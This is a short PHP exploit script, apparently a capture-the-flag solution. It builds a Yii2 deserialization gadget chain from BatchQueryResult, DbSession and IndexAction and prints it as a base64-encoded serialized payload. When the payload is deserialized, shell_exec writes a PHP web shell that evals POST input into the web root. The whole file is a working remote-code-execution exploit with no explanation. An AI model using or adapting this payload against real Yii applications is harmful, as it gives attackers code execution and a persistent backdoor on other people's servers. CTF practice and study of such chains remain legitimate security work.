<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2021-05-03 21:55:29
# @Last Modified by:   h1xa
# @Last Modified time: 2021-05-04 01:25:28
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
namespace yii\rest {
    class Action
    {
        public $checkAccess;
    }
    class IndexAction
    {
        public function __construct($func, $param)
        {
            $this->checkAccess = $func;
            $this->id = $param;
        }
    }
}
namespace yii\web {
    abstract class MultiFieldSession
    {
        public $writeCallback;
    }
    class DbSession extends MultiFieldSession
    {
        public function __construct($func, $param)
        {
            $this->writeCallback = [new \yii\rest\IndexAction($func, $param), "run"];
        }
    }
}
namespace yii\db {
    use yii\base\BaseObject;
    class BatchQueryResult
    {
        private $_dataReader;
        public function __construct($func, $param)
        {
            $this->_dataReader = new \yii\web\DbSession($func, $param);
        }
    }
}
namespace {
    $exp = new \yii\db\BatchQueryResult('shell_exec', 'echo "<?php eval(\$_POST[1]);phpinfo();?>" >/var/www/html/basic/web/1.php');
    echo(base64_encode(serialize($exp)));
}
